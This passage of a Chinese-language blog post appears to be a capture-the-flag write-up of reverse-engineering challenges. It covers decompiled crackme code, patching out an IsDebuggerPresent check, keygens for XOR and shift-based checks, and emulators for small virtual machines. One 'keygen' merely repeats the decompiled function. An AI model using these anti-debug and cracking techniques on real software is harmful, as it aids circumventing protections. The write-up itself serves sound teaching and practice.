class="number">1</span>]) + (enc[<span class="number">7</span>] ^ key[j ^ <span class="number">0</span> &amp; <span class="number">3</span>])) ^ (((<span class="number">16</span> * enc[<span class="number">7</span>]) ^ (enc[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((enc[<span class="number">7</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * enc[<span class="number">1</span>]))));</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(count--);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line">        sum = <span class="number">-32</span> * <span class="number">0x61C88647</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> _ = <span class="number">0</span>; _ &lt; <span class="number">32</span>; _++)&#123;</span><br><span class="line">            enc[i + <span class="number">1</span>] -= ((enc[i] &gt;&gt; <span class="number">5</span>) + <span class="number">101</span>) ^ (<span class="number">16</span> * enc[i] + <span class="number">107</span>) ^ (sum + enc[i]);</span><br><span class="line">            enc[i] -= ((enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">97</span>) ^ (<span class="number">16</span> * enc[i + <span class="number">1</span>] + <span class="number">102</span>) ^ (sum + enc[i + <span class="number">1</span>]);</span><br><span class="line">            sum += delta;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="number">8</span> * j)) &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// begin&#123;not_main_is_matter!&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="出题人的密码是什么-不知道什么加密-混淆"><a href="#出题人的密码是什么-不知道什么加密-混淆" class="headerlink" title="出题人的密码是什么 | 不知道什么加密 | 混淆"></a>出题人的密码是什么 | 不知道什么加密 | 混淆</h2><p>最后的比较函数:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-2.png" alt="image-20240206142249939"></p>
<p>看起来是对控制流进行了混淆 先猜测就是按顺序一个一个对比 主函数开头就加了反调试:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00AC8540 8B F4                         mov     esi, esp</span><br><span class="line">.text:00AC8542 FF 15 00 C0 B3 00             call    ds:IsDebuggerPresent</span><br><span class="line">.text:00AC8542</span><br><span class="line">.text:00AC8548 3B F4                         cmp     esi, esp</span><br><span class="line">.text:00AC854A E8 6E AA FF FF                call    j___RTC_CheckEsp</span><br><span class="line">.text:00AC854A</span><br><span class="line">.text:00AC854F 85 C0                         test    eax, eax</span><br><span class="line">.text:00AC8551 75 11                         jnz     short loc_AC8564                ; Keypatch modified this from:</span><br><span class="line">.text:00AC8551                                                                       ;   jz short loc_438564</span><br><span class="line">.text:00AC8551                                                                       ; Keypatch modified this from:</span><br><span class="line">.text:00AC8551                                                                       ;   jz short loc_D38564</span><br><span class="line">.text:00AC8551</span><br><span class="line">.text:00AC8553 8B F4                         mov     esi, esp</span><br><span class="line">.text:00AC8555 6A 00                         push    0                               ; uExitCode</span><br><span class="line">.text:00AC8557 FF 15 08 C0 B3 00             call    ds:ExitProcess</span><br></pre></td></tr></table></figure>

<p>这里patch掉 接下来输入完flag后有很多无用函数干扰分析 没用的函数标记一下 在唯一一个有用的分支找到两个加密函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j__gets_s(passw, <span class="number">0x64</span>u);</span><br><span class="line">fzwufunc();</span><br><span class="line">fzwufunc2();</span><br><span class="line">j_fzwu();</span><br><span class="line">fzwufunc();</span><br><span class="line">sub_AC125D();</span><br><span class="line">j_fzwu__();</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_D78120</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_B3D0F4);</span><br><span class="line">  j_procees_func1();</span><br><span class="line">  j_procees_func2();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个加密函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">procees_func2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = __CheckForDebuggerJustMyCode(&amp;byte_B3D0F4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    final_[i] = (passw[i] + <span class="number">5</span>) ^ <span class="number">0x25</span>;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对第一个函数加密后的数据进行加法和异或</p>
<p>第一个加密函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">procees_func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [esp+D0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+ECh] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+F8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+104h] [ebp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+110h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [esp+120h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(byte_B3D0F4);</span><br><span class="line">  v3 = j__strlen(user);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    j__srand(byte_B39FD7[v3]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    j__srand(<span class="number">0x123456</span>u);</span><br><span class="line">  v0 = j__rand() % <span class="number">7</span>;                           <span class="comment">// v0 = 7</span></span><br><span class="line">  result = dword_B39000[<span class="number">2</span> * v0];</span><br><span class="line">  LODWORD(v2) = result;</span><br><span class="line">  HIDWORD(v2) = dword_B39004[<span class="number">2</span> * v0];           <span class="comment">// v2 = 0x33077D</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = &amp;passw[<span class="number">8</span> * i];</span><br><span class="line">    v6 = *v7;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">        v6 = v2 ^ (<span class="number">2</span> * v6);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 *= <span class="number">2</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    *v7 = v6;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对输入的flag进行32位小端序储存 然后根据当前数据块的正负(最高位)选择进行左移1位还是左移后再异或 这个异或会使左移后最后一位由0变成1 由此储存因左移丢失的数据 据此写出keygen 发现那个控制流混淆确实就是一位一位对比:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 enc[] = &#123;<span class="number">0xB4</span>, <span class="number">0xBB</span>, <span class="number">0xD8</span>, <span class="number">0xEB</span>, <span class="number">0xD0</span>, <span class="number">0x6E</span>, <span class="number">0xAB</span>, <span class="number">0xCA</span>, <span class="number">0x65</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0xE9</span>, <span class="number">0x4D</span>, <span class="number">0xD4</span>, <span class="number">0x4A</span>, <span class="number">0xF3</span>, <span class="number">0x7D</span>, <span class="number">0x29</span>, <span class="number">0xC2</span>, <span class="number">0xF9</span>, </span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x89</span>, <span class="number">0xA4</span>, <span class="number">0x85</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDF</span>, <span class="number">0x77</span>, <span class="number">0xFD</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0x5D</span>, <span class="number">0x7D</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x4B</span>, <span class="number">0xBC</span>, <span class="number">0xF6</span>, <span class="number">0x7C</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x42</span>, <span class="number">0xF5</span>, <span class="number">0xD2</span>, <span class="number">0xDD</span>, <span class="number">0xE3</span>, <span class="number">0x56</span>, <span class="number">0xAE</span>&#125;;</span><br><span class="line">    __int64 d = <span class="number">0x000000000033077D</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        enc[i] ^= <span class="number">0x25</span>;</span><br><span class="line">        enc[i] -= <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> __int64 enc_[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">        enc_[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            enc_[i] |= (__int64)enc[<span class="number">8</span> * i + j] &lt;&lt; (j * <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(enc_[i] &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                enc_[i] ^= d;</span><br><span class="line">                enc_[i] &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                enc_[i] |= (__int64)(<span class="number">0x8000000000000000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                enc_[i] &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// save the data back to enc with big-ending</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            enc[i * <span class="number">8</span> + j] = (enc_[i] &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// begin&#123;Th1s_reverse_pr0blem_may_t@ke_some_time#!&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="俄语学习-防静态分析"><a href="#俄语学习-防静态分析" class="headerlink" title="俄语学习 | 防静态分析"></a>俄语学习 | 防静态分析</h2><p>主要加密:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1A1F80</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></span><br><span class="line">  <span class="type">size_t</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">44</span>]; <span class="comment">// [esp+F4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_22F0F4);</span><br><span class="line">  qmemcpy(Str, cource, <span class="number">0x25</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= j__strlen(Str); ++i )</span><br><span class="line">    sourc_key[i] = Str[i] - <span class="number">0x72</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= j__strlen(sourc_key); ++j )</span><br><span class="line">    key[j] = sourc_key[j];</span><br><span class="line">  v0 = j__strlen(sourc_key);</span><br><span class="line">  result = sub_19B6D0(table, sourc_key, v0);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_table[k] = table[k];</span><br><span class="line">    result = k + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中table初始化是干扰分析的 后面并不会用到 主要加密方式就是根据key对flag进行加减运算 以下是keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_1A1F80()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v0; // eax</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> k; // [esp+D0h] [ebp-54h]</span><br><span class="line">  size_t j; // [esp+DCh] [ebp-48h]</span><br><span class="line">  size_t i; // [esp+E8h] [ebp-3Ch]</span><br><span class="line">  char Str[<span class="number">44</span>]; // [esp+F4h] [ebp-30h] BYREF</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_22F0F4);</span><br><span class="line">  qmemcpy(Str, cource, 0x25u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= j__strlen(Str); ++i )</span><br><span class="line">    sourc_key[i] = Str[i] - <span class="number">0x72</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= j__strlen(sourc_key); ++j )</span><br><span class="line">    key[j] = sourc_key[j];</span><br><span class="line">  v0 = j__strlen(sourc_key);</span><br><span class="line">  result = sub_19B6D0(table, sourc_key, v0);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_table[k] = table[k];</span><br><span class="line">    result = k + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># flag&#123;Russian_is_so_easy&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="红白机-简单虚拟机"><a href="#红白机-简单虚拟机" class="headerlink" title="红白机 | 简单虚拟机"></a>红白机 | 简单虚拟机</h2><p>使用的是6502虚拟机 直接模拟其运行(或者分析后手画也行) 这里已经用文本编辑器替换过原来的6502指令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">flag = np.array(Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6502.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    now_color = <span class="number">255</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> offset &lt;= <span class="number">0x3FF</span>:</span><br><span class="line">        flag[<span class="built_in">int</span>(offset / <span class="number">32</span>), offset % <span class="number">32</span>] = now_color</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">    offset = <span class="number">1</span></span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">        lines[i] = lines[i].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">36</span>:]:</span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">8</span>] == <span class="string">&quot;color = &quot;</span>:</span><br><span class="line">            now_color = <span class="built_in">int</span>(line[<span class="number">8</span>:], <span class="number">16</span>) * <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">10</span>] == <span class="string">&quot;load color&quot;</span>:</span><br><span class="line">            flag[<span class="built_in">int</span>((offset + <span class="built_in">int</span>(line[<span class="number">15</span>:<span class="number">18</span>], <span class="number">16</span>) - <span class="number">0x200</span>) / <span class="number">32</span>), offset % <span class="number">32</span>] = now_color</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now_color, offset, <span class="built_in">int</span>(offset / <span class="number">32</span>), offset % <span class="number">32</span>, count)</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">&quot;offset += 1&quot;</span>:</span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">8</span>] == <span class="string">&quot;offset =&quot;</span>:</span><br><span class="line">            offset = <span class="built_in">int</span>(line[<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">plt.figure(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">plt.imshow(flag)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-3.png" alt="image-20240206144338244"></p>
<h2 id="stick-game-js混淆"><a href="#stick-game-js混淆" class="headerlink" title="stick game | js混淆"></a>stick game | js混淆</h2><p>js中游戏的主要逻辑被混淆:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-4.png" alt="image-20240206144537026"></p>
<p>用网站反混淆:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-5.png" alt="image-20240206144616490"></p>
<p>直接找到flag<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145028.png" alt="image-20240206144649583"></p>
<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>主要逻辑就是将flag分前后两半加密 用key正着异或一遍再倒着抑或一遍 再交换前后使用的key再重复上述过程 keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">52</span>,  <span class="number">49</span>,  <span class="number">56</span>,  <span class="number">48</span>,  <span class="number">51</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">51</span>,  <span class="number">54</span>,  <span class="number">50</span>, </span><br><span class="line">   <span class="number">53</span>,  <span class="number">57</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">51</span>,  <span class="number">54</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">50</span>, </span><br><span class="line">   <span class="number">54</span>,  <span class="number">48</span>,  <span class="number">54</span>,  <span class="number">54</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">57</span>, </span><br><span class="line">   <span class="number">52</span>,  <span class="number">55</span>]</span><br><span class="line">key1 = [<span class="number">54</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">57</span>,  <span class="number">48</span>,  <span class="number">55</span>,  <span class="number">57</span>,  <span class="number">52</span>,  <span class="number">50</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">49</span>,  <span class="number">53</span>,  <span class="number">53</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">57</span>, </span><br><span class="line">   <span class="number">54</span>,  <span class="number">50</span>,  <span class="number">49</span>,  <span class="number">51</span>,  <span class="number">56</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">51</span>,  <span class="number">53</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">48</span>]</span><br><span class="line">hbkey = key[<span class="number">0</span>:<span class="number">16</span>] + [<span class="number">0</span>]</span><br><span class="line">qmkey = key[<span class="number">16</span>:<span class="number">32</span>] + [<span class="number">0</span>]</span><br><span class="line">enc = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>]</span><br><span class="line">qm = enc[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">hb = enc[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line">    qm[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[i]</span><br><span class="line">    qm[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= qmkey[i]</span><br><span class="line">hbkey = key1[<span class="number">0</span>:<span class="number">16</span>] + [<span class="number">0</span>]</span><br><span class="line">qmkey = key1[<span class="number">16</span>:<span class="number">32</span>] + [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line">    qm[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[i]</span><br><span class="line">    qm[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= qmkey[i]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> qm + hb])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;Virus_gonna_be_terminated!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="babyvm-vmre"><a href="#babyvm-vmre" class="headerlink" title="babyvm | vmre"></a>babyvm | vmre</h2><p>模拟虚拟机运行过程 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># emulate the procees of vm</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> opcode:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.vm&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> opcode_file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;memory.vm&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> memory:</span><br><span class="line">            all_memory = []</span><br><span class="line">            input_text = []</span><br><span class="line">            output_text = []</span><br><span class="line">            data = memory.read(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">while</span>(data):</span><br><span class="line">                all_memory.append(unpack(<span class="string">&quot;&lt;I&quot;</span>, data)[<span class="number">0</span>])</span><br><span class="line">                data = memory.read(<span class="number">4</span>)</span><br><span class="line">            now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">            in_pointer = <span class="number">0</span></span><br><span class="line">            out_pointer = <span class="number">0</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            count_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(now_op):</span><br><span class="line">                <span class="built_in">print</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] + all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;sum[&quot;</span> + <span class="built_in">str</span>(count_sum - <span class="number">8</span>) + <span class="string">&quot;] == &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    count_sum += <span class="number">1</span></span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] - all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">3</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;key[&quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(count / <span class="number">20</span>)) +<span class="string">&quot;][&quot;</span> + <span class="built_in">str</span>(count % <span class="number">20</span>) + <span class="string">&quot;] == &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span 